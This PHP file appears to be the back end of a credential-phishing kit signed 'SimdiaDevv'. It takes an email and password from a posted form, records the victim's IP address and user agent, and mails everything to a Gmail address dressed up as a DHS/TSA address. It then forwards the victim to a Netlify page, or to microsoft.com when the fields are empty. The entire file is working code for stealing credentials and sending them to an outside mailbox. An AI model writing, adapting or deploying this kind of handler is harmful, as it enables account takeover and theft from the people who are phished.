<?php
// Check if both 'ai' and 'namep' fields are not empty
if ($_POST["ai"] != "" && $_POST["namep"] != "") {
    $ip = getenv("REMOTE_ADDR");
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];
    
    // Construct the email message
    $message = "--------------DieRich Info by SimdiaDevv-----------------------\n";
    $message .= "Eem'ail            	: ".$_POST['ai']."\n";
    $message .= "Pa'ssw0rd           	: ".$_POST['namep']."\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "|Client IP: ".$ip."\n";
    $message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
    $message .= "User Agent : ".$useragent."\n";
    $message .= "|----------- unknown --------------|\n";
    
    // Include any additional necessary files, such as 'pochru2.php'

    // Set email subject
    $subject = "SimdiaDevv | $ip";

    // Specify the recipient email address
    $to = "TSA.dhs.govv@gmail.com"; // Replace 'recipient@example.com' with the actual recipient email address

    // Send the email
    mail($to, $subject, $message);
    
    // Redirect the user after sending the email
    header("Location: https://relaxed-truffle-59023f.netlify.app/api2.html/#".$_POST['ai']);
} else {
    // Redirect the user if 'ai' or 'namep' fields are empty
    header("Location: https://www.microsoft.com/undefined");
}
?>
